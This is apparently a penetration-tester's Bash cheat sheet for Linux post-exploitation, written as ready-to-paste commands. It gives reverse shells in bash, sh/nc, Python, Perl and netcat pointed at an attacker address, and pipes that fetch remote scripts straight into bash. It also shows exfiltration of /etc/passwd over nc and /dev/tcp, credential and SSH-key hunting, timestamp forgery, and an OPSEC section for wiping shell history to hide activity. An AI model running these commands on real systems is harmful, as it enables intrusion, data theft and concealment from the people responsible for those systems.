# Bash

**Tags:** `#bash` `#linux` `#scripting` `#commandline` `#postexploit` `#lolbas`

Essential Bash reference for Linux post-exploitation, enumeration, file transfer, and shell management. Bash is always available on Linux targets — no tools needed for many common tasks.

> [!note]
> When you have a limited shell (no TTY, no tab completion, no job control), upgrade first. A proper PTY shell is required for sudo, su, vi, ssh, and interactive programs.

---

## Shell Upgrade / PTY

```bash
# Python PTY (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# After spawning PTY — get full terminal
# 1. Background the shell: Ctrl+Z
# 2. On attacker:
stty raw -echo; fg
# 3. In shell:
export TERM=xterm
stty rows 40 cols 180     # match your terminal size

# script method (when python unavailable)
script /dev/null -c bash

# socat (best option — full PTY)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

---

## Reverse Shells

```bash
# Bash TCP (most common)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Bash TCP — explicit exec form (more compatible)
exec bash -i &>/dev/tcp/10.10.14.5/4444 <&1

# /dev/tcp one-liner (no bash built-in required)
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# sh (when bash unavailable)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.5",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# Netcat (with -e flag)
nc -e /bin/sh 10.10.14.5 4444

# Netcat (without -e — OpenBSD nc)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```

---

## File Transfer

```bash
# Serve files from attacker (Kali)
python3 -m http.server 8000
python3 -m http.server 8000 --bind 10.10.14.5

# Download to target
wget http://10.10.14.5:8000/file -O /tmp/file
curl -o /tmp/file http://10.10.14.5:8000/file
curl -s http://10.10.14.5:8000/file > /tmp/file

# Execute without writing to disk
curl -s http://10.10.14.5:8000/script.sh | bash
wget -qO- http://10.10.14.5:8000/linpeas.sh | bash

# Base64 transfer (when no wget/curl)
# Attacker:
base64 -w 0 file.bin; echo
# Target:
echo "<base64>" | base64 -d > /tmp/file
chmod +x /tmp/file

# SCP (if SSH available)
scp user@10.10.14.5:/path/file /tmp/file
scp /tmp/loot user@10.10.14.5:/home/user/

# nc file transfer
# Attacker receives:
nc -lvnp 4444 > received_file
# Target sends:
nc -w 3 10.10.14.5 4444 < /etc/passwd

# /dev/tcp (no nc needed)
cat /etc/passwd > /dev/tcp/10.10.14.5/4444

# Serve from target (exfil)
python3 -m http.server 8001 --directory /tmp/loot/
```

---

## Enumeration One-Liners

```bash
# System info
uname -a
cat /etc/os-release
cat /proc/version
hostname; id; whoami

# Users
cat /etc/passwd | grep -v nologin | grep -v false
getent passwd | awk -F: '$3 >= 1000 {print $1}'
cat /etc/sudoers 2>/dev/null
sudo -l

# SUID binaries (escalation vectors)
find / -perm -u=s -type f 2>/dev/null

# SGID binaries
find / -perm -g=s -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null | grep -v proc

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/
crontab -l

# Processes
ps auxf
ps aux | grep root

# Network
ip a; ip r; ip neigh
ss -tulpn
netstat -tulpn 2>/dev/null
cat /etc/hosts

# Open files / sockets
lsof -i -n -P 2>/dev/null

# Services (systemd)
systemctl list-units --type=service --state=running
ls -la /etc/systemd/system/ /etc/init.d/

# Interesting files
find /home /root /opt /var /tmp -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.bak" 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find / -name ".bash_history" -o -name ".zsh_history" 2>/dev/null

# Config files with credentials
grep -ri "password" /etc/ 2>/dev/null | grep -v Binary
grep -ri "password" /var/www/ 2>/dev/null | grep -v Binary
```

---

## File Operations

```bash
# Read
cat /etc/passwd
less /var/log/auth.log
head -50 file.txt
tail -f /var/log/syslog          # follow live

# Find + grep combo
find /var/www -name "*.php" | xargs grep -l "password" 2>/dev/null

# Archive
tar czf /tmp/loot.tar.gz /home/user/
tar xzf archive.tar.gz -C /tmp/

# Compress single file
gzip -c file > file.gz
gunzip file.gz

# Timestamps — check/modify
stat file.txt
touch -t 202001010000 file.txt   # set timestamp
touch -r /bin/ls file.txt        # copy timestamp from reference file

# Permissions
chmod +x script.sh
chmod 4755 binary                # setuid
chown user:group file
```

---

## Looping Patterns

```bash
# Iterate over wordlist (password spray, bruteforce)
while IFS= read -r line; do
    echo "Testing: $line"
    # command here
done < /usr/share/wordlists/rockyou.txt

# For loop over range
for i in $(seq 1 254); do
    ping -c 1 -W 1 10.10.10.$i &>/dev/null && echo "10.10.10.$i is up"
done

# Port scan without tools
for port in 22 80 443 445 3389 8080; do
    (echo >/dev/tcp/10.10.10.10/$port) 2>/dev/null && echo "$port open"
done

# Subnet ping sweep
for ip in 10.10.10.{1..254}; do
    ping -c 1 -W 1 $ip &>/dev/null && echo "$ip UP" &
done; wait

# Process list of hosts
while IFS= read -r host; do
    echo "[*] $host"
    curl -s -o /dev/null -w "%{http_code}" "http://$host/"
    echo ""
done < hosts.txt
```

---

## Text Processing

```bash
# grep
grep -r "password" /var/www/ --include="*.php"
grep -v "^#" /etc/sudoers              # strip comments
grep -oP '(?<=password=)[^\s]+'        # extract value (Perl regex)

# sed
sed 's/old/new/g' file.txt
sed -n '10,20p' file.txt              # print lines 10-20
sed -i 's/ATTACKER_IP/10.10.14.5/g'  # in-place edit

# awk
awk -F: '{print $1,$3}' /etc/passwd   # print fields 1 and 3
awk '{print $NF}' file.txt            # last field
awk 'NR==5' file.txt                  # line 5

# cut
cut -d: -f1 /etc/passwd               # first field by delimiter
cut -d',' -f2,4 data.csv

# sort / uniq
sort file.txt | uniq -c | sort -rn    # count occurrences
cat hashes.txt | sort -u              # deduplicate

# tr
echo "STRING" | tr '[:upper:]' '[:lower:]'
cat file | tr -d '\r'                 # strip Windows CR

# xargs
cat ips.txt | xargs -I{} curl -s http://{}:80/

# tee (write + stdout simultaneously)
./linpeas.sh | tee /tmp/linpeas_out.txt
```

---

## Encode / Decode

```bash
# Base64
echo -n "string" | base64
echo -n "c3RyaW5n" | base64 -d

# URL encode
echo -n "payload" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# Hex
echo -n "string" | xxd -p
echo "737472696e67" | xxd -p -r

# MD5 / SHA
echo -n "password" | md5sum
echo -n "password" | sha256sum
md5sum file.bin
```

---

## Scripting Patterns

```bash
# Conditional execution
command && echo "success" || echo "failed"

# Check if root
if [ "$(id -u)" -eq 0 ]; then echo "Running as root"; fi

# Check if file exists
[ -f /etc/shadow ] && cat /etc/shadow

# Check if command exists
command -v python3 &>/dev/null && echo "python3 available"

# Background jobs
./tool &
jobs
fg %1
kill %1

# Redirect stderr
command 2>/dev/null
command 2>&1 | tee output.txt

# Subshell
(cd /tmp && ./exploit)

# Here-string
ssh user@host 'bash -s' << 'EOF'
whoami
id
hostname
EOF
```

---

## OPSEC

```bash
# Disable bash history for session
unset HISTFILE
export HISTSIZE=0

# Clear history
history -c
cat /dev/null > ~/.bash_history

# Work in /dev/shm (in-memory, no disk write)
cd /dev/shm

# Check logs for your activity
grep $(whoami) /var/log/auth.log
last | head

# Check open files (what can see your activity)
lsof | grep $(whoami)
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
